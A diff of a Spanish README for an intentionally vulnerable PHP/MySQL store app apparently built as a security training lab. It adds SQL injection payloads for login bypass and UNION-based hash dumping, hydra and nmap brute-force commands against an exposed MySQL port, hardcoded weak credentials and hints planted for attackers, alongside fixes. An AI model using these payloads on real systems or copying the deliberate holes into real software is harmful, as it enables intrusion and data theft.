@@ -278,7 +278,7 @@ define('DB_HOST', '127.0.0.1');
 define('DB_PORT', 3306);
 define('DB_NAME', 'ferreteria');
 define('DB_USER', 'ferreteria_app');
-define('DB_PASS', '<definido en docker-compose.yml>');
+define('DB_PASS', 'ferreteria');   // igual que MYSQL_PASSWORD en docker-compose.yml
 ```
 
 ### 3.7 Configurar Apache
@@ -332,18 +332,23 @@ Estos usuarios se crean con `database/02_seed.sql`.
 
 | Usuario | Contraseña | Uso |
 |---|---|---|
-| `ferreteria_app` | _definida en `docker-compose.yml`_ | Conexión de la aplicación |
-| `root` | _definida en `docker-compose.yml`_ | Administración del contenedor |
+| `ferreteria_app` | `ferreteria` (débil **a propósito** — ver V2) | Conexión de la aplicación; accesible en remoto (`@'%'`) |
+| `root` | `R00t.Tornillo.2026` | Administración del contenedor; **solo** desde `localhost` |
+
+> La contraseña de `ferreteria_app` es intencionalmente débil y la cuenta es accesible desde la red: forma parte de la vulnerabilidad V2 (sección 5). `root` no es accesible en remoto.
 
 ---
 
 ## 5. Vulnerabilidades implementadas
 
+El proyecto incluye **dos** vulnerabilidades, introducidas y documentadas de forma deliberada. Ambas son **explotables de extremo a extremo** desde la red del laboratorio. El resto del código es correcto y seguro (sentencias preparadas, `htmlspecialchars()` al imprimir, verificación de rol y de propiedad en cada vista restringida), para que estas dos sean las únicas puertas de entrada.
+
 | # | Vulnerabilidad | Nivel | Ubicación |
 |---|---|---|---|
 | V1 | Inyección SQL (SQLi) | Código | `public/login.php`, `public/index.php` (buscador) |
-| V2 | Puertos abiertos innecesarios | Servidor | `docker/docker-compose.yml` |
-| V3 | IDOR (Insecure Direct Object Reference) | Código | `public/comprador/factura.php` |
+| V2 | Base de datos expuesta a la red con cuenta débil | Servidor | `docker/docker-compose.yml` |
+
+> **Nota sobre las pistas.** Como el proyecto también se usa como ejercicio de ataque, en el código **que llega al navegador** se dejaron pistas sutiles (no obvias) para que un atacante atento reconozca cada vulnerabilidad sin que se le entregue el exploit resuelto. Se describen en cada vulnerabilidad, en el apartado *Pistas dejadas*. Los comentarios de PHP (`//`, `/* */`) y de SQL (`--`) **no** se envían al navegador: sirven para el equipo de desarrollo y no cuentan como pistas para el atacante.
 
 ### V1 — Inyección SQL
 
@@ -370,24 +375,63 @@ $sql = "SELECT id, nombre, descripcion, precio, imagen FROM productos
         WHERE nombre LIKE '%$q%'";
 ```
 
-**Consideraciones de diseño:** los mensajes de error de MySQL se muestran en pantalla para facilitar la identificación de la vulnerabilidad durante la etapa de ataque.
+**Consideraciones de diseño:** los mensajes de error de MySQL se muestran en pantalla (`includes/config.php` → `MOSTRAR_ERRORES = true`) para facilitar la identificación de la vulnerabilidad durante la etapa de ataque. Además, el campo de correo del login usa `type="text"` (y no `type="email"`) a propósito, para que el navegador no rechace las comillas antes de enviar el formulario.
 
-**Mitigación (no aplicada a propósito):** usar sentencias preparadas con `mysqli_prepare()` y `bind_param()`, almacenar contraseñas con `password_hash()` / `password_verify()` y ocultar los errores de base de datos al usuario.
+**Cómo explotarla (ejemplos):**
 
-### V2 — Puertos abiertos innecesarios
+1. **Saltar el login (autenticación).** En el campo de correo escribir una entrada que cierre la comilla y comente el resto:
+   ```
+   Correo:    admin@eltornillo.local' -- -
+   Contraseña: (cualquier cosa)
+   ```
+   La consulta queda `... WHERE correo = 'admin@eltornillo.local' -- -' AND password = MD5('...')`; todo lo que sigue a `-- ` se ignora y se inicia sesión sin saber la contraseña. También funciona `' OR '1'='1' -- -`, que devuelve la primera fila (el administrador).
+2. **Reconocer la inyección en el buscador.** Escribir una comilla simple (`'`) en el buscador del catálogo provoca un error de MySQL visible en pantalla: es la señal de que la entrada llega sin escapar a la consulta.
+3. **Extraer datos con UNION.** A través del buscador (`index.php?q=...`), con una carga tipo `' UNION SELECT 1,correo,password,rol,5,6 FROM usuarios -- -` se vuelcan los correos y los hashes MD5 de todos los usuarios. Los hashes MD5 de contraseñas débiles (`Admin123`, etc.) se rompen con cualquier servicio o diccionario, lo que da acceso a todas las cuentas de la aplicación.
 
-**Dónde se encuentra:** `docker/docker-compose.yml`.
+**Pistas dejadas (visibles para el atacante):**
 
-**Cómo se introdujo:** el puerto 3306 del contenedor de MySQL se publica en todas las interfaces de la VM (`0.0.0.0`) en lugar de limitarlo a `127.0.0.1`. La aplicación solo necesita acceder a la base de datos de forma local, por lo que esta exposición es innecesaria y permite conectarse a MySQL directamente desde cualquier equipo de la red del laboratorio.
+- El **error de MySQL** que aparece al escribir una comilla en el login o en el buscador (la pista más fuerte: revela que la entrada se usa sin sanear).
+- Un **comentario HTML** junto al buscador en `index.php` (visible con *Ver código fuente*): `<!-- buscador: filtra productos por el texto que se escribe, directo contra la tabla productos -->`, que insinúa que el texto va directo a la consulta.
 
-```yaml
-# docker/docker-compose.yml — exposición intencional
-services:
-  db:
-    image: mysql:8.0
-    ports:
-      - "3306:3306"        # Debería ser "127.0.0.1:3306:3306"
-```
+**Cómo evitarla / solventarla:**
+
+1. **Sentencias preparadas con parámetros** en todas las consultas que reciban datos del usuario, de modo que la entrada nunca se concatene en la cadena SQL:
+   ```php
+   // Login seguro
+   $stmt = mysqli_prepare($conn, 'SELECT id, nombre, rol, password FROM usuarios WHERE correo = ?');
+   mysqli_stmt_bind_param($stmt, 's', $correo);
+   mysqli_stmt_execute($stmt);
+   // ...y comparar con password_verify($password, $hash)
+
+   // Buscador seguro
+   $stmt = mysqli_prepare($conn, 'SELECT ... FROM productos WHERE nombre LIKE ?');
+   $patron = '%' . $q . '%';
+   mysqli_stmt_bind_param($stmt, 's', $patron);
+   ```
+2. **Almacenar contraseñas con `password_hash()` / `password_verify()`** (bcrypt/argon2) en lugar de MD5, y ampliar la columna `usuarios.password` (p. ej. `VARCHAR(255)`).
+3. **Ocultar los errores de base de datos al usuario** en producción (`display_errors = Off`), registrándolos solo en el log del servidor, y devolver un mensaje genérico.
+4. **Validar y tipar la entrada** (longitud, formato de correo) como defensa en profundidad, sin que sustituya a las sentencias preparadas.
+
+### V2 — Base de datos expuesta a la red con cuenta débil
+
+**Dónde se encuentra:** `docker/docker-compose.yml` (y, como consecuencia, el servicio MySQL del contenedor).
+
+**Cómo se introdujo y por qué es explotable.** No basta con "dejar un puerto abierto": la exposición se diseñó para que lleve a un compromiso real y acotado de la base de datos. Se combinan cuatro condiciones:
+
+1. **Puerto publicado en todas las interfaces.** El puerto 3306 del contenedor se publica en `0.0.0.0` en lugar de `127.0.0.1`, por lo que MySQL responde a cualquier equipo de la red del laboratorio (el banner de versión se ve con `nmap -sV`).
+   ```yaml
+   # docker/docker-compose.yml — exposición intencional
+   services:
+     db:
+       image: mysql:8.0
+       ports:
+         - "3306:3306"        # Debería ser "127.0.0.1:3306:3306"
+   ```
+2. **Cuenta accesible en remoto.** La imagen de MySQL crea la cuenta de la aplicación como `'ferreteria_app'@'%'`, es decir, válida desde cualquier host (no solo `localhost`).
+3. **Contraseña débil.** Esa cuenta usa la contraseña `ferreteria` (igual al nombre de la base de datos): adivinable y fácil de obtener por fuerza bruta con un diccionario.
+4. **Privilegios amplios sobre la base.** `ferreteria_app` tiene **todos los privilegios sobre `ferreteria.*`**, de modo que, una vez autenticado, el atacante lee y modifica toda la información del proyecto.
+
+**Alcance acotado (importante).** La exposición no compromete el equipo anfitrión ni el resto de la red: la cuenta `root` **no** es accesible en remoto (el contenedor no define `MYSQL_ROOT_HOST`, así que root queda en `localhost`), y `ferreteria_app` **no** tiene los privilegios `FILE` ni `SUPER`, por lo que no puede leer/escribir archivos del sistema ni salir de la base `ferreteria`.
 
 **Detalle adicional:** Docker escribe sus propias reglas de `iptables`, por lo que un puerto publicado queda accesible aunque el firewall `ufw` esté activo y no lo permita.
 
@@ -399,31 +443,41 @@ services:
 | 80/tcp | Apache (aplicación) | Sí |
 | 3306/tcp | MySQL (Docker) | **No** — expuesto intencionalmente |
 
-**Mitigación (no aplicada a propósito):** publicar el puerto solo en loopback (`127.0.0.1:3306:3306`) o no publicarlo y conectar la aplicación por una red interna de Docker.
+**Cómo explotarla (ejemplo):**
 
-### V3 — IDOR en las facturas
+1. Descubrir el servicio desde un equipo de la red del laboratorio:
+   ```bash
+   nmap -sV -p 3306 <IP-de-la-VM>        # 3306/tcp open  mysql  MySQL 8.0.x
+   ```
+2. Obtener la contraseña de `ferreteria_app` (adivinándola a partir del nombre del sitio/base, o por fuerza bruta):
+   ```bash
+   nmap -p 3306 --script mysql-brute <IP-de-la-VM>
+   # o con hydra:  hydra -l ferreteria_app -P diccionario.txt <IP> mysql
+   ```
+3. Conectarse directamente y leer o modificar los datos:
+   ```bash
+   mysql -h <IP-de-la-VM> -u ferreteria_app -p ferreteria
+   # SELECT correo, password, rol FROM usuarios;   -- hashes para crackear
+   # SELECT * FROM facturas;                        -- datos de clientes
+   # UPDATE productos SET precio = 0.01;            -- manipulación de datos
+   ```
 
-**Dónde se encuentra:** `public/comprador/factura.php`, la vista que muestra el detalle de una factura a partir de su identificador en la URL (`factura.php?id=<número>`).
+**Pistas dejadas (visibles para el atacante):**
 
-**Cómo se introdujo:** la página verifica que exista una sesión con rol de comprador, pero **no verifica que la factura solicitada pertenezca al usuario de esa sesión**. La consulta filtra únicamente por el `id` recibido, y los identificadores de factura son enteros consecutivos (`AUTO_INCREMENT`), por lo que son fáciles de predecir.
+- El propio **servicio MySQL en el 3306** se anuncia a la red (lo encuentra un escaneo de puertos).
+- Un **comentario HTML** en el pie de página de todo el sitio (visible con *Ver código fuente*): `<!-- infra lab: apache2 + php 8.3 · los datos se guardan en mysql 8 (contenedor docker, :3306) · pendiente cerrar el puerto -->`, que orienta a escanear el puerto de la base.
 
-```php
-// public/comprador/factura.php — control de acceso incompleto (intencional)
-require_once '../../includes/auth.php';
-requerir_rol('comprador');           // Solo valida el rol, no la propiedad
+**Cómo evitarla / solventarla:**
 
-$id = (int) $_GET['id'];
-$sql = "SELECT f.id, f.fecha, f.total, u.nombre, u.correo
-        FROM facturas f
-        JOIN usuarios u ON u.id = f.comprador_id
-        WHERE f.id = $id";           // Falta: AND f.comprador_id = <usuario de la sesión>
-```
-
-**Datos expuestos:** cualquier comprador autenticado puede consultar las facturas de otros clientes, con su nombre, correo, fecha, productos comprados, cantidades y montos.
-
-**Consideraciones de diseño:** el `id` se convierte a entero con `(int)`, de modo que este punto expone solo el IDOR y no se confunde con la inyección SQL de V1.
-
-**Mitigación (no aplicada a propósito):** agregar a la consulta la condición `AND f.comprador_id = ?` con el ID del usuario guardado en la sesión, responder con `403` o `404` cuando la factura no le pertenezca, y opcionalmente usar identificadores no predecibles (UUID) en las URL.
+1. **No publicar el puerto en toda la red.** Publicarlo solo en loopback, o mejor, no publicarlo y comunicar la app con la base por una red interna de Docker:
+   ```yaml
+   ports:
+     - "127.0.0.1:3306:3306"   # solo accesible desde la propia VM
+   # o eliminar 'ports' y usar una red interna de Docker
+   ```
+2. **Contraseñas fuertes y únicas** para las cuentas de base de datos (largas, aleatorias), gestionadas fuera del repositorio (variables de entorno / secretos), nunca iguales al nombre de usuario o de la base.
+3. **Mínimo privilegio.** Que `ferreteria_app` tenga solo los privilegios que necesita (`SELECT, INSERT, UPDATE, DELETE` sobre las tablas concretas) y restringir el host de la cuenta (`'ferreteria_app'@'127.0.0.1'`) en lugar de `'%'`.
+4. **Firewall y segmentación.** Reglas de `iptables`/seguridad que bloqueen el 3306 hacia la red (recordando que Docker inserta sus propias reglas, por lo que hay que gestionarlo a nivel de la publicación del puerto, no solo con `ufw`).
 
 ---
 
@@ -458,12 +512,21 @@ El repositorio sigue **GitFlow**.
 
 | Componente | Estado |
 |---|---|
-| README y arquitectura | ✅ Versión inicial |
+| README y arquitectura | ✅ Listo |
 | Base de datos en Docker (`schema` y `seed`) | ✅ Listo |
 | Index (catálogo y buscador) | ✅ Listo |
-| Login y Register | ⏳ Pendiente |
-| Vista de comprador (carrito y facturas) | ⏳ Pendiente |
-| Vista de vendedor | ⏳ Pendiente |
-| Panel de administrador | ⏳ Pendiente |
+| Login y Register | ✅ Listo |
+| Vista de comprador (carrito y facturas) | ✅ Listo |
+| Vista de vendedor | ✅ Listo |
+| Panel de administrador | ✅ Listo |
+| Vulnerabilidades V1 y V2 (explotables y documentadas) | ✅ Listo |
+| Estética del header/footer (sin franja clara al scrollear de más) | ✅ Listo |
 | Script `install.sh` | ⏳ Pendiente |
 | Prueba de instalación completa desde cero | ⏳ Pendiente |
+
+### Cambios recientes
+
+- **Estética (header/footer).** Se corrigió el efecto de rebote al hacer scroll "de más": antes se veía una franja clara por encima del header o por debajo del footer. Ahora el elemento `<html>` toma el gris oscuro del header/footer (`public/assets/css/estilos.css`), de modo que la zona de rebote se pinta de ese color y el header/footer parecen extenderse.
+- **Vulnerabilidades reducidas a dos.** Se retiró la antigua vulnerabilidad de IDOR en `public/comprador/factura.php`: la vista ahora filtra las facturas por el comprador de la sesión, así que cada usuario solo ve las suyas.
+- **V2 ahora es explotable de extremo a extremo.** La base de datos quedó expuesta a la red con una cuenta remota (`ferreteria_app@'%'`) de contraseña débil (`ferreteria`) y privilegios amplios sobre la base del proyecto, pero acotada (root no es accesible en remoto; sin privilegio `FILE`/`SUPER`).
+- **Pistas sutiles para el ataque.** Se dejaron comentarios HTML discretos (buscador en `index.php`, infraestructura en el pie de página) y se mantienen visibles los errores de MySQL, para que los atacantes reconozcan V1 y V2 sin recibir el exploit resuelto.
